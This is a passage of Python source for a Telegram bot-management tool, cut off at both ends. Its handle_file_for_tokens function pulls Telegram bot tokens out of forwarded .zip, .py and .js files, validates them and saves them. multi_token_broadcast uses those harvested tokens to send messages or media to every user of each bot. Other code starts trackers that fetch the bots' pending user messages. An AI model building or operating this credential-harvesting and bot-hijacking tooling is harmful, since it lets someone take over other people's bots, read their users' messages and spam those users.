                "name": me.first_name,
                "username": me.username or "",
                "id": me.id,
            }
            added.append(f"✅ @{me.username or me.first_name}")
        except Exception as e:
            failed.append(f"❌ {tok[:20]}... — {str(e)[:35]}")

    if added or failed:
        save_data(data)

    summary_lines = added[:30] + (["…"] if len(added) > 30 else []) + failed[:10]
    summary = "\n".join(summary_lines)
    try:
        await progress.edit_text(
            f"🔑 <b>ʙᴜʟᴋ ᴀᴅᴅ ᴅᴏɴᴇ</b>\n\n"
            f"✅ ᴀᴅᴅᴇᴅ: <b>{len(added)}</b>  |  ❌ ꜰᴀɪʟᴇᴅ: <b>{len(failed)}</b>\n\n"
            f"{summary}",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass

    await update.message.reply_text("ᴋʏᴀ ᴋᴀʀɴᴀ ʜᴀɪ ᴀʙ?", reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0))
    return ConversationHandler.END


async def remove_bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ ꜱɪʀꜰ ᴏᴡɴᴇʀ")
        return
    cancel_bg_tasks(context)
    data = load_data()
    ʙᴏᴛꜱ = data.get("ʙᴏᴛꜱ", {})
    if not ʙᴏᴛꜱ:
        await update.message.reply_text("📭 ᴋᴏɪ ʙᴏᴛ ɴᴀʜɪ", reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0))
        return
    kb = []
    row = []
    for token, info in ʙᴏᴛꜱ.items():
        label = f"@{info.get('username')}" if info.get("username") else info.get("name", "Bot")
        row.append(btn(f"DEL {label}", "danger"))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([btn("OWNER PANEL", "primary")])
    await update.message.reply_text(
        "❌ <b>REMOVE BOT</b>\nClick to remove:",
        parse_mode=ParseMode.HTML,
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True),
    )


async def remove_bot_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    text = _norm(update.message.text or "").upper()
    data = load_data()
    ʙᴏᴛꜱ = data.get("ʙᴏᴛꜱ", {})
    for token, info in list(ʙᴏᴛꜱ.items()):
        uname = (info.get("username") or "").upper()
        name = (info.get("name") or "").upper()
        if (uname and uname in text) or (name and name in text):
            del data["ʙᴏᴛꜱ"][token]
            save_data(data)
            if context.user_data.get("active_token") == token:
                context.user_data.pop("active_token", None)
            await update.message.reply_text(
                f"✅ <b>{name}</b> removed",
                parse_mode=ParseMode.HTML,
                reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0),
            )
            return
    await update.message.reply_text("❌ Bot nahi mila", reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0))


async def my_ʙᴏᴛꜱ(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 0):
    if not is_admin(update.effective_user.id):
        return
    cancel_bg_tasks(context)
    data = load_data()
    ʙᴏᴛꜱ = data.get("ʙᴏᴛꜱ", {})
    if not ʙᴏᴛꜱ:
        await update.message.reply_text("📭 ᴋᴏɪ ʙᴏᴛ ɴᴀʜɪ", reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0))
        return
    context.user_data["_bots_page"] = page
    PAGE_SIZE = 10
    items = list(ʙᴏᴛꜱ.items())
    total = len(items)
    start = page * PAGE_SIZE
    end = min(start + PAGE_SIZE, total)
    text = f"🤖 <b>ʏᴏᴜʀ ʙᴏᴛꜱ</b> ({start+1}–{end} of {total})\n\n"
    for _, info in items[start:end]:
        text += f"• <b>{info.get('name','?')}</b> (@{info.get('username','?')})\n"
    await update.message.reply_text(text + "\nꜱᴇʟᴇᴄᴛ ᴋᴀʀᴏ.", parse_mode=ParseMode.HTML, reply_markup=ʙᴏᴛꜱ_kb(ʙᴏᴛꜱ, page))


async def select_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    cancel_bg_tasks(context)
    raw = update.message.text or ""
    text = _norm(raw).upper().replace(" ", "")
    text_sp = _norm(raw).upper()
    data = load_data()
    ʙᴏᴛꜱ = data.get("ʙᴏᴛꜱ", {})
    matched = None  # (token, info)

    for token, info in ʙᴏᴛꜱ.items():
        uname = (info.get("username") or "").upper().replace(" ", "")
        name = (info.get("name") or "").upper()
        name_c = "".join(ch for ch in name if ch.isalnum())
        text_c = "".join(ch for ch in text_sp if ch.isalnum())
        ok = False
        if uname and uname in text:
            ok = True
        if uname and f"@{uname}" in text:
            ok = True
        if name and name in text_sp:
            ok = True
        if name_c and len(name_c) >= 4 and name_c in text_c:
            ok = True
        if ok:
            matched = (token, info)
            break

    # If user pressed SELECT and only 1 bot saved → select it
    if not matched and "SELECT" in text_sp and len(ʙᴏᴛꜱ) == 1:
        matched = next(iter(ʙᴏᴛꜱ.items()))

    # If SELECT + unique username fragment
    if not matched and "SELECT" in text_sp:
        hits = []
        for token, info in ʙᴏᴛꜱ.items():
            uname = (info.get("username") or "").upper()
            if uname and uname in text_sp:
                hits.append((token, info))
        if len(hits) == 1:
            matched = hits[0]

    if not matched:
        await update.message.reply_text(
            "❌ Bot match nahi hua.\nMY BOTS se phir SELECT dabao.",
            reply_markup=ʙᴏᴛꜱ_kb(ʙᴏᴛꜱ) if ʙᴏᴛꜱ else owner_kb(),
        )
        return

    token, info = matched
    context.user_data["active_token"] = token
    try:
        set_active_token(update.effective_user.id, token)
    except Exception:
        pass

    # INSTANT reply — oneshot background me (hang nahi)
    await update.message.reply_text(
        f"✅ <b>SELECTED</b>\n\n"
        f"<b>{info.get('name')}</b> (@{info.get('username')})\n\n"
        f"Tracker starting…\n"
        f"ᴍᴀɪɴ ᴍᴇɴᴜ ꜱᴇ ꜱᴇɴᴅ / ᴠɪᴇᴡ / ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴄʜᴀʟᴀᴏ.",
        parse_mode=ParseMode.HTML,
        reply_markup=main_kb(update.effective_user.id),
    )

    def _bg_start():
        try:
            start_tracker(token, app=context.application)
        except Exception:
            try:
                start_tracker(token)
            except Exception:
                pass

    _bg_start()

    async def _bg_fetch():
        try:
            n = await oneshot_fetch_updates(token)
            if n and n > 0:
                try:
                    await context.bot.send_message(
                        update.effective_chat.id,
                        f"✅ {n} pending messages saved from @{info.get('username')}",
                    )
                except Exception:
                    pass
        except Exception:
            pass

    try:
        context.application.create_task(_bg_fetch())
    except Exception:
        try:
            asyncio.get_event_loop().create_task(_bg_fetch())
        except Exception:
            pass


async def add_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ ꜱɪʀꜰ ᴏᴡɴᴇʀ")
        return ConversationHandler.END
    cancel_bg_tasks(context)
    await update.message.reply_text("➕ User ID bhejo:\n/cancel", reply_markup=back_main_kb())
    return WAIT_ADD_ADMIN


async def add_admin_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        uid = int((update.message.text or "").strip())
        data = load_data()
        if uid not in data["ᴀᴅᴍɪɴꜱ"]:
            data["ᴀᴅᴍɪɴꜱ"].append(uid)
            save_data(data)
        await update.message.reply_text(f"✅ Admin: {uid}", reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0))
    except Exception:
        await update.message.reply_text("❌ Invalid")
        return WAIT_ADD_ADMIN
    return ConversationHandler.END


async def rem_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ ꜱɪʀꜰ ᴏᴡɴᴇʀ")
        return ConversationHandler.END
    cancel_bg_tasks(context)
    await update.message.reply_text("➖ User ID bhejo:\n/cancel", reply_markup=back_main_kb())
    return WAIT_REMOVE_ADMIN


async def rem_admin_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        uid = int((update.message.text or "").strip())
        data = load_data()
        if uid in data["ᴀᴅᴍɪɴꜱ"]:
            data["ᴀᴅᴍɪɴꜱ"].remove(uid)
            save_data(data)
        await update.message.reply_text("✅ Removed", reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0))
    except Exception:
        await update.message.reply_text("❌ Invalid")
        return WAIT_REMOVE_ADMIN
    return ConversationHandler.END


async def admin_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    text = "👥 <b>ADMINS</b>\n\n"
    for a in data.get("ᴀᴅᴍɪɴꜱ", []):
        text += f"• <code>{a}</code>\n"
    if not data.get("ᴀᴅᴍɪɴꜱ"):
        text += "ᴋᴏɪ ɴᴀʜɪ"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0))


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    await update.message.reply_text(
        f"🟢 <b>STATUS</b>\n\n✅ ᴏɴʟɪɴᴇ\n🤖 {len(data.get('ʙᴏᴛꜱ', {}))} ʙᴏᴛꜱ\n"
        f"👥 {len(data.get('ᴀᴅᴍɪɴꜱ', []))} ᴀᴅᴍɪɴꜱ",
        parse_mode=ParseMode.HTML,
        reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0),
    )


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    clear_temp(context)
    await update.message.reply_text(
        "❌ Cancelled",
        reply_markup=main_kb(update.effective_user.id),
    )
    return ConversationHandler.END



async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single entry for all reply-keyboard buttons — always matches."""
    if not update.message or not update.message.text:
        return
    if not is_admin(update.effective_user.id):
        return
    # ── Auto-detect tokens pasted anywhere ──────────────────────────────────
    raw_text = update.message.text or ""
    if ":" in raw_text:
        found_toks = extract_bot_tokens(raw_text)
        if found_toks:
            prog = await update.message.reply_text(
                f"🔍 <b>{len(found_toks)} ᴛᴏᴋᴇɴ ᴍɪʟᴇ!</b> ᴠᴀʟɪᴅᴀᴛ ʜᴏ ʀᴀʜᴇ ʜᴀɪɴ…",
                parse_mode=ParseMode.HTML)
            added, failed = await auto_validate_and_save(found_toks)
            result = (f"✅ <b>{len(added)} ʙᴏᴛ ꜱᴀᴠᴇ ʜᴜᴇ</b>  ❌ {len(failed)} ꜰᴀɪʟ\n\n"
                     + "\n".join(added[:20]) + ("\n…" if len(added) > 20 else ""))
            try:
                await prog.edit_text(result, parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
    if not context.user_data.get("active_token"):
        try:
            t0 = get_persisted_active(update.effective_user.id)
            if t0:
                context.user_data["active_token"] = t0
        except Exception:
            pass
    t = _norm(update.message.text).upper()

    # stop bg when switching
    if any(k in t for k in (
        "VIEW MESSAGES", "SEND MESSAGE", "BROADCAST", "CHANGE NAME", "CHANGE BIO",
        "CHANGE DESC", "CHANGE PHOTO", "ALL USERS", "OWNER PANEL", "MAIN MENU",
        "MY BOTS", "USER LIST", "VIEW USER MSGS", "BACK",
    )):
        cancel_bg_tasks(context)


    if t.startswith("USER ") or "USER " in t:
        digits = "".join(ch for ch in t if ch.isdigit())
        if digits:
            context.user_data["selected_uid"] = int(digits)
            cancel_bg_tasks(context)
            await update.message.reply_text(
                f"✅ User <code>{digits}</code> selected",
                parse_mode=ParseMode.HTML,
                reply_markup=user_action_kb(),
            )
            return

    if "VIEW USER MSGS" in t or ("VIEW USER" in t and "MSG" in t):
        return await view_user_msgs(update, context)
    if "VIEW MESSAGES" in t and "USER" not in t:
        return await view_menu(update, context)
    if "ALL MESSAGES" in t:
        return await all_messages(update, context)
    if "SEND MESSAGE" in t and "BOT" not in t and "USER" not in t and "THIS" not in t:
        return await send_menu(update, context)
    if "USER LIST" in t:
        return await user_list_menu(update, context)
    if "ALL USERS" in t:
        return await all_users(update, context)
    if "OWNER PANEL" in t:
        return await owner_panel(update, context)
    if "MY BOTS" in t:
        return await my_ʙᴏᴛꜱ(update, context, context.user_data.get("_bots_page", 0))
    if "NEXT PAGE" in t:
        pg = context.user_data.get("_bots_page", 0) + 1
        return await my_ʙᴏᴛꜱ(update, context, pg)
    if "PREV PAGE" in t:
        pg = max(0, context.user_data.get("_bots_page", 0) - 1)
        return await my_ʙᴏᴛꜱ(update, context, pg)
    if "ADMIN LIST" in t:
        return await admin_list(update, context)
    if "SERVER STATUS" in t:
        return await status(update, context)
    if "MAIN MENU" in t:
        return await back_main(update, context)
    if "BACK" in t and "REMOVE" not in t:
        return await back_handler(update, context)
    if "REMOVE BOT" in t:
        return await remove_bot_start(update, context)
    if "DEL " in t or t.startswith("❌"):
        return await remove_bot_click(update, context)
    # SELECT bot buttons (must be before other checks)
    if "SELECT" in t or ("@" in t and "DEL" not in t and "REMOVE" not in t and "ADD" not in t):
        data = load_data()
        ʙᴏᴛꜱ = data.get("ʙᴏᴛꜱ", {})
        if ʙᴏᴛꜱ and ("SELECT" in t or any(
            ((info.get("username") or "").upper() in t)
            for info in ʙᴏᴛꜱ.values()
            if info.get("username")
        )):
            return await select_bot(update, context)


async def cancel_and_route(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """End any open conversation and route to the new button silently."""
    clear_temp(context)
    try:
        await menu_router(update, context)
    except Exception:
        try:
            await back_main(update, context)
        except Exception:
            pass
    return ConversationHandler.END




# ═══════════════════════════════════════════════════════════════
#   AUTO FILE TOKEN EXTRACTOR
#   Any document sent by owner → tokens extracted automatically
# ═══════════════════════════════════════════════════════════════

async def handle_file_for_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Auto token extractor — only .zip / .py / .js files.
    ZIP: reads every file inside and extracts tokens from all.
    PY / JS: reads as text and extracts tokens.
    No button needed — just forward files to the bot.
    """
    if not is_admin(update.effective_user.id):
        return
    msg = update.message
    if not msg or not msg.document:
        return

    fname = (msg.document.file_name or "").lower()
    allowed_ext = (".zip", ".py", ".js")
    if not any(fname.endswith(ext) for ext in allowed_ext):
        # Silently ignore all other file types
        return

    # Download file
    try:
        import io
        tg_file = await context.bot.get_file(msg.document.file_id)
        buf = io.BytesIO()
        await tg_file.download_to_memory(buf)
        raw_bytes = buf.getvalue()
    except Exception as e:
        await msg.reply_text(f"❌ Download fail: {e}")
        return

    all_tokens = []

    if fname.endswith(".zip"):
        # Open ZIP and scan every file inside
        import zipfile
        try:
            with zipfile.ZipFile(io.BytesIO(raw_bytes)) as zf:
                for inner_name in zf.namelist():
                    try:
                        inner_bytes = zf.read(inner_name)
                        text = inner_bytes.decode("utf-8", errors="ignore")
                        found = extract_bot_tokens(text)
                        all_tokens.extend(found)
                    except Exception:
                        continue
        except zipfile.BadZipFile:
            await msg.reply_text("❌ Invalid ZIP file.")
            return

    else:
        # .py or .js — read as text
        text = raw_bytes.decode("utf-8", errors="ignore")
        all_tokens = extract_bot_tokens(text)

    if not all_tokens:
        await msg.reply_text(
            f"⚠️ <b>{fname}</b> me koi bot token nahi mila.",
            parse_mode=ParseMode.HTML,
        )
        return

    unique = list(set(all_tokens))
    added = save_file_tokens(unique)
    total = len(get_file_tokens())
    # Also validate and save to MY BOTS (ʙᴏᴛꜱ dict) with username
    ʙᴏᴛꜱ_added = []
    data_d = load_data()
    data_d.setdefault("ʙᴏᴛꜱ", {})
    for tok in unique:
        if tok in data_d["ʙᴏᴛꜱ"]:
            continue
        try:
            _tb = Bot(token=tok)
            await _tb.initialize()
            _me = await _tb.get_me()
            await _tb.shutdown()
            data_d["ʙᴏᴛꜱ"][tok] = {
                "name": _me.first_name,
                "username": _me.username or "",
                "id": _me.id,
            }
            ʙᴏᴛꜱ_added.append(f"✅ @{_me.username or _me.first_name}")
        except Exception:
            ʙᴏᴛꜱ_added.append(f"⚠️ {tok[:20]}... (ɪɴᴠᴀʟɪᴅ)")
    if ʙᴏᴛꜱ_added:
        save_data(data_d)
    ʙᴏᴛꜱ_line = "\n".join(ʙᴏᴛꜱ_added[:10])
    await msg.reply_text(
        f"🔑 <b>ᴛᴏᴋᴇɴꜱ ᴇxᴛʀᴀᴄᴛᴇᴅ</b>\n"
        f"📄 File: <code>{fname}</code>\n"
        f"ᴍɪʟᴀ: <b>{len(unique)}</b>  |  ꜰɪʟᴇ ꜱᴀᴠᴇᴅ: <b>{added}</b>  |  ʙᴏᴛꜱ ᴀᴅᴅᴇᴅ: <b>{len(ʙᴏᴛꜱ_added)}</b>\n\n"
        f"{ʙᴏᴛꜱ_line}\n\n"
        f"📁 ʙʀᴏᴀᴅᴄᴀꜱᴛ ꜰɪʟᴇ → ɪɴ ꜱᴀʙᴋᴇ ᴜꜱᴇʀꜱ ᴋᴏ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴋᴀʀ",
        parse_mode=ParseMode.HTML,
    )


# ═══════════════════════════════════════════════════════════════
#   MULTI-TOKEN BROADCAST CORE
#   Broadcasts one message to users of EVERY given token
# ═══════════════════════════════════════════════════════════════



import io as _io

async def _dl_media(context, msg) -> tuple:
    """
    Download media from manager-bot context, return (buf, type, caption).
    Needed because file_id is bot-specific — can't reuse across ʙᴏᴛꜱ.
    Returns (BytesIO, msg_type, caption_text)
    """
    caption = msg.caption or ""
    if msg.photo:
        f = await context.bot.get_file(msg.photo[-1].file_id)
        buf = _io.BytesIO(); await f.download_to_memory(buf); buf.seek(0)
        return buf, "photo", caption
    if msg.video:
        f = await context.bot.get_file(msg.video.file_id)
        buf = _io.BytesIO(); await f.download_to_memory(buf); buf.seek(0)
        return buf, "video", caption
    if msg.document:
        f = await context.bot.get_file(msg.document.file_id)
        buf = _io.BytesIO(); await f.download_to_memory(buf); buf.seek(0)
        fname = getattr(msg.document, "file_name", None) or "file"
        return (buf, fname), "document", caption
    if msg.voice:
        f = await context.bot.get_file(msg.voice.file_id)
        buf = _io.BytesIO(); await f.download_to_memory(buf); buf.seek(0)
        return buf, "voice", caption
    if msg.audio:
        f = await context.bot.get_file(msg.audio.file_id)
        buf = _io.BytesIO(); await f.download_to_memory(buf); buf.seek(0)
        return buf, "audio", caption
    return None, "text", msg.text or ""


async def _send_media_to(bot_obj, uid: int, media_result: tuple, txt: str = ""):
    """Send downloaded media to a user via a target bot."""
    data, mtype, caption = media_result
    cap = caption or txt or ""
    if mtype == "photo":
        await bot_obj.send_photo(chat_id=uid, photo=data, caption=cap)
    elif mtype == "video":
        await bot_obj.send_video(chat_id=uid, video=data, caption=cap)
    elif mtype == "document":
        buf, fname = data
        await bot_obj.send_document(chat_id=uid, document=buf, filename=fname, caption=cap)
    elif mtype == "voice":
        await bot_obj.send_voice(chat_id=uid, voice=data, caption=cap)
    elif mtype == "audio":
        await bot_obj.send_audio(chat_id=uid, audio=data, caption=cap)
    else:
        await bot_obj.send_message(chat_id=uid, text=txt or caption or ".")


async def multi_token_broadcast(tokens_data: list, update: Update, context=None) -> tuple:
    """
    Broadcast to users of ALL given tokens.
    Downloads media once via manager bot, re-uploads to each target.
    tokens_data: list of {"token": str, ...} OR bare strings.
    Returns: (total_ok, total_fail, summary_lines)
    """
    total_ok = 0
    total_fail = 0
    summary_lines = []

    # Pre-download media ONCE via manager bot — avoids file_id cross-bot error
    media_result = None
    plain_text = update.message.text or "" if update.message else ""
    if context and update.message and not plain_text:
        try:
            media_result = await _dl_media(context, update.message)
        except Exception as e:
            summary_lines.append(f"⚠️ Media download: {e}")

    for td in tokens_data:
        tok = td.get("token") if isinstance(td, dict) else str(td)
        if not tok:
            continue
        bot_obj = None
        try:
            bot_obj = Bot(token=tok)
            await bot_obj.initialize()
            try:
                me = await bot_obj.get_me()
                label = f"@{me.username}" if me.username else (me.first_name or tok[:15])
            except Exception:
                label = tok[:20] + "..."

            users = get_broadcast_targets(tok)
            if not users:
                summary_lines.append(f"⚪ {label} — 0 users, skip")
                continue

            ok = 0
            fail = 0
            sem = asyncio.Semaphore(8)

            async def _one(uid, _tok=tok, _bot=bot_obj):
                nonlocal ok, fail
                async with sem:
                    try:
                        if media_result and media_result[1] != "text":
                            data, mtype, cap = media_result
                            if hasattr(data, 'seek'):
                                data.seek(0)
                            elif isinstance(data, tuple) and hasattr(data[0], 'seek'):
                                data[0].seek(0)
                            await _send_media_to(_bot, uid, media_result)
                        elif plain_text:
                            await _bot.send_message(chat_id=uid, text=plain_text)
                        else:
                            fail += 1; return
                        try:
                            log_outbound(_tok, int(uid), plain_text or "[media]")
                        except Exception:
                            pass
                        ok += 1
                    except Exception:
                        fail += 1

            await asyncio.gather(*[_one(u) for u in users])
            summary_lines.append(f"✅ {label} — {ok} sent, {fail} fail ({len(users)} targets)")
            total_ok += ok
            total_fail += fail

        except Exception as e:
            summary_lines.append(f"❌ {tok[:15]}... — {str(e)[:60]}")
        finally:
            if bot_obj:
                try:
                    await bot_obj.shutdown()
                except Exception:
                    pass

    return total_ok, total_fail, summary_lines


# ═══════════════════════════════════════════════════════════════
#   BROADCAST FILE — tokens extracted from forwarded files
# ═══════════════════════════════════════════════════════════════

async def broadcast_file_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    cancel_bg_tasks(context)
    file_toks = get_file_tokens()
    if not file_toks:
        await update.message.reply_text(
            "📭 <b>Koi file token saved nahi.</b>\n\n"
            "Bot ko text / .env / .py / .json files forward karo.\n"
            "Automatic extract ho jayenge, phir BROADCAST FILE.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(update.effective_user.id),
        )
        return ConversationHandler.END

    preview = []
    for td in file_toks[:25]:
        tok = td.get("token", "")
        when = td.get("added_at", "")
        preview.append(f"• {tok[:28]}... [{when}]")
    extra = f"\n… aur {len(file_toks) - 25} more" if len(file_toks) > 25 else ""
    preview_text = "\n".join(preview)

    await update.message.reply_text(
        f"📁 <b>BROADCAST FILE</b>\n\n"
        f"File-extracted ʙᴏᴛꜱ: <b>{len(file_toks)}</b>\n\n"
        f"{preview_text}{extra}\n\n"
        f"In SABHI ʙᴏᴛꜱ ke users ko ek saath broadcast hoga.\n"
        f"ᴍᴇꜱꜱᴀɢᴇ / ᴘʜᴏᴛᴏ / ᴠɪᴅᴇᴏ ʙʜᴇᴊᴏ.  /cancel",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_FILE_BROADCAST


async def broadcast_file_content(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    t = _norm(update.message.text or "").upper()
    if any(x in _norm(t).upper() for x in ["BACK", "MAIN", "MENU", "CANCEL"]):
        clear_temp(context)
        await back_main(update, context)
        return ConversationHandler.END

    file_toks = get_file_tokens()
    if not file_toks:
        await update.message.reply_text("📭 Tokens list khaali.", reply_markup=main_kb(update.effective_user.id))
        return ConversationHandler.END

    prog = await update.message.reply_text(
        f"📡 Sending to users of <b>{len(file_toks)}</b> bot(s)…",
        parse_mode=ParseMode.HTML,
    )
    ok, fail, summary = await multi_token_broadcast(file_toks, update, context)
    s = "\n".join(summary[:30])
    more = f"\n… {len(summary) - 30} more ʙᴏᴛꜱ" if len(summary) > 30 else ""
    try:
        await prog.edit_text(
            f"📁 <b>BROADCAST FILE — Done</b>\n\n"
            f"✅ Total sent: <b>{ok}</b>  |  ❌ Fail: <b>{fail}</b>\n\n"
            f"{s}{more}",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass
    return ConversationHandler.END


# ═══════════════════════════════════════════════════════════════
#   BROADCAST ADDED — tokens added manually via OWNER PANEL
# ═══════════════════════════════════════════════════════════════

async def broadcast_added_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    cancel_bg_tasks(context)
    data = load_data()
    ʙᴏᴛꜱ = data.get("ʙᴏᴛꜱ", {})
    if not ʙᴏᴛꜱ:
        await update.message.reply_text(
            "📭 <b>Owner panel me koi bot nahi.</b>\n\n"
            "OWNER PANEL → ADD BOT TOKEN se pehle ʙᴏᴛꜱ add karo.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(update.effective_user.id),
        )
        return ConversationHandler.END

    lines = []
    for tok, info in ʙᴏᴛꜱ.items():
        name = info.get("name") or f"@{info.get('username')}" or tok[:20]
        uname = f" (@{info.get('username')})" if info.get("username") else ""
        lines.append(f"• {name}{uname}")
    lines_text = "\n".join(lines[:25])
    extra = f"\n… aur {len(ʙᴏᴛꜱ) - 25} more" if len(ʙᴏᴛꜱ) > 25 else ""

    await update.message.reply_text(
        f"➕ <b>BROADCAST ADDED</b>\n\n"
        f"Owner panel ʙᴏᴛꜱ: <b>{len(ʙᴏᴛꜱ)}</b>\n\n"
        f"{lines_text}{extra}\n\n"
        f"In SABHI ʙᴏᴛꜱ ke users ko ek saath broadcast hoga.\n"
        f"ᴍᴇꜱꜱᴀɢᴇ / ᴘʜᴏᴛᴏ / ᴠɪᴅᴇᴏ ʙʜᴇᴊᴏ.  /cancel",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_ADDED_BROADCAST


async def broadcast_added_content(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    t = _norm(update.message.text or "").upper()
    if any(x in t for x in ["BACK", "MAIN", "MENU", "CANCEL"]):
        clear_temp(context)
        await back_main(update, context)
        return ConversationHandler.END

    data = load_data()
    ʙᴏᴛꜱ = data.get("ʙᴏᴛꜱ", {})
    if not ʙᴏᴛꜱ:
        await update.message.reply_text("📭 ᴋᴏɪ ʙᴏᴛ ɴᴀʜɪ.", reply_markup=main_kb(update.effective_user.id))
        return ConversationHandler.END

    tokens_data = [{"token": tok, "name": info.get("name", "")} for tok, info in ʙᴏᴛꜱ.items()]
    prog = await update.message.reply_text(
        f"📡 Sending to users of <b>{len(tokens_data)}</b> bot(s)…",
        parse_mode=ParseMode.HTML,
    )
    ok, fail, summary = await multi_token_broadcast(tokens_data, update, context)
    s = "\n".join(summary[:30])
    more = f"\n… {len(summary) - 30} more ʙᴏᴛꜱ" if len(summary) > 30 else ""
    try:
        await prog.edit_text(
            f"➕ <b>BROADCAST ADDED — Done</b>\n\n"
            f"✅ Total sent: <b>{ok}</b>  |  ❌ Fail: <b>{fail}</b>\n\n"
            f"{s}{more}",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass
    return ConversationHandler.END


# ================== CLONE BOT ==================

async def clone_bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    if not is_main_owner(uid):
        await update.message.reply_text("❌ ꜱɪʀꜰ ᴍᴀɪɴ ᴏᴡɴᴇʀ ᴋᴇ ʟɪʏᴇ")
        return ConversationHandler.END
    await update.message.reply_text(
        "🤖 <b>ᴄʟᴏɴᴇ ʙᴏᴛ</b>\n\n"
        "Naye bot ka token bhejo jise clone karna hai:\n"
        "<i>BotFather se naya bot banao, uska token yahan bhejo</i>\n/cancel",
        parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
    return WAIT_CLONE_TOKEN


async def clone_token_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    raw    = (update.message.text or "").strip()
    try: await update.message.delete()
    except Exception: pass
    tokens = extract_bot_tokens(raw)
    if not tokens:
        await update.message.reply_text(
            "❌ Valid token nahi mila.\nFormat: <code>123456:ABCdef…</code>\n/cancel",
            parse_mode=ParseMode.HTML)
        return WAIT_CLONE_TOKEN
    tok = tokens[0]
    try:
        r = await _tg_post(tok, "getMe", {})
        if not r.get("ok"):
            raise Exception(r.get("description", "getMe failed"))
        me = r["result"]
        context.user_data["_clone_token"]    = tok
        context.user_data["_clone_name"]     = me.get("first_name","?")
        context.user_data["_clone_username"] = me.get("username","") or str(me.get("id","?"))
        await update.message.reply_text(
            f"✅ <b>Bot verified!</b>\n"
            f"🤖 <b>{me.get('first_name','?')}</b> (@{me.get('username','?')})\n\n"
            "Ab is clone bot ka <b>Owner Telegram User ID</b> bhejo:\n"
            "<i>Owner jiska ye bot hoga uska numeric Telegram ID</i>\n/cancel",
            parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_CLONE_OWNER
    except Exception as e:
        await update.message.reply_text(
            f"❌ Token invalid: <code>{e}</code>\nDobara bhejo ya /cancel",
            parse_mode=ParseMode.HTML)
        return WAIT_CLONE_TOKEN


async def clone_owner_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid    = update.effective_user.id
    raw    = (update.message.text or "").strip()
    if not raw.lstrip("-").isdigit():
        await update.message.reply_text(
            "❌ Sirf numeric Telegram User ID bhejo. Example: <code>987654321</code>",
            parse_mode=ParseMode.HTML)
        return WAIT_CLONE_OWNER

    owner_id   = int(raw)
    clone_tok  = context.user_data.get("_clone_token","")
    clone_name = context.user_data.get("_clone_name","Clone")
    clone_user = context.user_data.get("_clone_username","?")

    prog = await update.message.reply_text(
        "⚙️ <b>ᴄʟᴏɴᴇ ꜱᴛᴀʀᴛɪɴɢ…</b>", parse_mode=ParseMode.HTML)

    # ── Save clone record to main data ────────────────────────────────────────
    data = load_data()
    data.setdefault("clones", {})
    data["clones"][str(owner_id)] = {
        "token":      clone_tok,  "owner_id": owner_id,
        "name":       clone_name, "username": clone_user,
        "created_at": __import__("time").strftime("%Y-%m-%d %H:%M"),
    }
    save_data(data)

    # ── Launch clone in THIS process immediately ───────────────────────────────
    import asyncio as _aio
    clone_data_dir = _DATA_DIR.parent / f"clone_data_{owner_id}"
    clone_app = await launch_clone_app(clone_tok, owner_id, clone_data_dir)

    if clone_app:
        status = (f"✅ <b>ᴄʟᴏɴᴇ ʟɪᴠᴇ!</b>\n\n"
                  f"🤖 <b>@{clone_user}</b> ᴀʙ ᴏɴʟɪɴᴇ ʜᴀɪ\n"
                  f"👤 ᴏᴡɴᴇʀ: <code>{owner_id}</code>\n\n"
